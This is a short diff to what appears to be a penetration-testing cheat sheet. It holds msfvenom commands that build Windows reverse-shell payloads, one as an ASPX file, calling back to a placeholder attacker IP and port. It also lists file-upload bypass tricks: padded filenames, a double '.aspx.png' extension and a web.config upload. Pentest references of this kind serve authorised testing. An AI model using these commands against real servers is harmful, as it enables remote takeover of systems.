@@ -47,6 +47,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> 
 # ASPX
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f aspx -o rev.aspx
 # file upload bypass
-# try filename "rev.aspx..... .. . . ."
-# try filename "rev.aspx.png"
+#   try filename "rev.aspx..... .. . . ."
+#   try filename "rev.aspx.png"
+#   try web.config (File_Upload_Bypass.md)
 ```
